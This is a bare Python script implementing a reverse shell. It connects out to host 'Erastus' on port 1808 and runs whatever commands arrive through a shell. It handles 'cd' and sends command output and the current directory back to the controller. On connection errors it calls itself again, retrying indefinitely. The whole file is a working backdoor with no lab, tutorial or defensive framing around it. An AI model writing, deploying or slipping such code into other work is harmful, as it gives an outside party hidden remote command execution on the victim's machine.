import socket
import subprocess
import os


def socket_client():
    try:
        s = socket.socket()
        host = "Erastus"
        port = 1808
        s.connect((host, port))
        while True:
            data = s.recv(20480)
            if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8"))

            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output_byte = cmd.stdout.read() + cmd.stderr.read()
                output = str(output_byte.decode("utf-8", "ignore"))
                current_directory = os.getcwd() + "> "
                s.send(str.encode(output + current_directory))

                print(output)
    except ConnectionResetError:
        socket_client()
    except ConnectionRefusedError:
        socket_client()
    except OSError:
        socket_client()


socket_client()
